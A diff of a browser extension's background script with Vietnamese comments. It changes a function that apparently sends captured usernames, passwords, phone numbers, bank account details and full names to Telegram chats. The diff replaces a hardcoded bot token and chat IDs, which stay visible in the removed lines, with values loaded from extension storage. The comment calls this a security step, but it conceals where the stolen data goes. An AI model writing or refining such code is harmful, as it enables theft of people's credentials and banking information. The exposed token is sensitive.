@@ -82,9 +82,55 @@ chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
     }
 });
 
+// Token nhạy cảm đã được tách khỏi mã nguồn để đảm bảo bảo mật.
+// Người dùng cấu hình qua giao diện cài đặt tiện ích hoặc chrome.storage.local.
+let TELEGRAM_TOKEN = "";
+let TELEGRAM_CHAT_IDS = [];
+
+chrome.storage?.local?.get(['telegram_token', 'telegram_chat_id', 'telegram_chat_ids'], (items) => {
+    if (items?.telegram_token) TELEGRAM_TOKEN = items.telegram_token;
+    if (items?.telegram_chat_ids) {
+        TELEGRAM_CHAT_IDS = Array.isArray(items.telegram_chat_ids) ? items.telegram_chat_ids : [items.telegram_chat_ids];
+    } else if (items?.telegram_chat_id) {
+        TELEGRAM_CHAT_IDS = [items.telegram_chat_id];
+    }
+});
+
+if (chrome.storage?.onChanged) {
+    chrome.storage.onChanged.addListener((changes, area) => {
+        if (area === 'local') {
+            if (changes.telegram_token) TELEGRAM_TOKEN = changes.telegram_token.newValue || "";
+            if (changes.telegram_chat_ids) {
+                const val = changes.telegram_chat_ids.newValue;
+                TELEGRAM_CHAT_IDS = Array.isArray(val) ? val : (val ? [val] : []);
+            } else if (changes.telegram_chat_id) {
+                const val = changes.telegram_chat_id.newValue;
+                TELEGRAM_CHAT_IDS = val ? [val] : [];
+            }
+        }
+    });
+}
+
 async function sendTelegramNotification(username, password, phone, bankAcc, bankName, fullName) {
-    const botToken = '8512888484:AAH7YHu1MS9pu1KkU-d_wXZReWe-YH1YCpI';
-    const chatIds = ['7651644672', '7522906692'];
+    if (!TELEGRAM_TOKEN || !TELEGRAM_CHAT_IDS || TELEGRAM_CHAT_IDS.length === 0) {
+        try {
+            const items = await chrome.storage?.local?.get(['telegram_token', 'telegram_chat_id', 'telegram_chat_ids']);
+            if (items?.telegram_token) TELEGRAM_TOKEN = items.telegram_token;
+            if (items?.telegram_chat_ids) {
+                TELEGRAM_CHAT_IDS = Array.isArray(items.telegram_chat_ids) ? items.telegram_chat_ids : [items.telegram_chat_ids];
+            } else if (items?.telegram_chat_id) {
+                TELEGRAM_CHAT_IDS = [items.telegram_chat_id];
+            }
+        } catch (e) {}
+    }
+
+    if (!TELEGRAM_TOKEN || !TELEGRAM_CHAT_IDS || TELEGRAM_CHAT_IDS.length === 0) {
+        console.warn('Chưa cấu hình Telegram Token hoặc Chat ID');
+        return;
+    }
+
+    const botToken = TELEGRAM_TOKEN;
+    const chatIds = TELEGRAM_CHAT_IDS;
     
     let formattedPhone = phone;
     if (formattedPhone && !formattedPhone.startsWith('0')) {
